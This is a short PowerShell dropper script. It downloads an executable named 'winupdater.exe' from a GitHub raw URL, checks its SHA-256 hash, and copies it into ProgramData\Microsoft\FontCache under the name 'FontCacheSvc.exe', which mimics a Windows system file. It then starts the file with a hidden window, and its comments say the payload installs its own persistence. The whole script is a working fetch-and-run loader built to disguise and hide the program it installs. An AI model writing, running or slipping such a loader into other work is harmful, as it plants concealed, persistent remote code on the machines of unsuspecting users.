# Downloads the rebuilt WinUpdater agent, verifies SHA-256, and launches it.
# The agent copies itself to FontCache/SysMgr and installs its own persistence.
# No plugins folder is created next to the drop.

$ErrorActionPreference = 'Stop'
$Url  = 'https://github.com/mrt707mr-hub/m0th/raw/refs/heads/main/winupdater.exe'
$Want = 'B86619318AE91D78BF33D3DFF4546C7464CAAD12527AA3505994B4D92CC5BAA8'

$Dir = Join-Path $env:ProgramData 'Microsoft\FontCache'
New-Item -ItemType Directory -Path $Dir -Force | Out-Null
$Out = Join-Path $Dir 'FontCacheSvc.exe'

$Tmp = Join-Path $env:TEMP ('wu_' + [guid]::NewGuid().ToString('N') + '.bin')
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $wc = New-Object System.Net.WebClient
    $wc.Headers['User-Agent'] = 'Mozilla/5.0'
    $wc.DownloadFile($Url, $Tmp)

    $Got = (Get-FileHash -Algorithm SHA256 -LiteralPath $Tmp).Hash
    if ($Got -ne $Want) { throw "hash mismatch: $Got" }

    Copy-Item -LiteralPath $Tmp -Destination $Out -Force
    Start-Process -FilePath $Out -WindowStyle Hidden
}
finally {
    if (Test-Path -LiteralPath $Tmp) { Remove-Item -LiteralPath $Tmp -Force -ErrorAction SilentlyContinue }
}
